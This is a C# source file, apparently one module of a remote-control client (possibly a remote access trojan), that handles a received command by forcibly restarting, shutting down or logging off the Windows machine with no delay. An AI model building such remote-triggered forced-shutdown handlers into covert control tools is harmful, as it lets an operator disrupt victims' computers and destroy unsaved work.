using Client.Helper;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Text;

namespace Client.Handle_Packet
{
    public class HandlePcOptions
    {
        public HandlePcOptions(string option)
        {
            switch (option)
            {
                case "restart":
                    {
                        Methods.ClientExit();
                        Process.Start("Shutdown", "/r /f /t 00");
                        break;
                    }

                case "shutdown":
                    {
                        Methods.ClientExit();
                        Process.Start("Shutdown", "/s /f /t 00");
                        break;
                    }

                case "logoff":
                    {
                        Methods.ClientExit();
                        Process.Start("Shutdown", "/l /f");
                        break;
                    }
            }
        }
    }
}
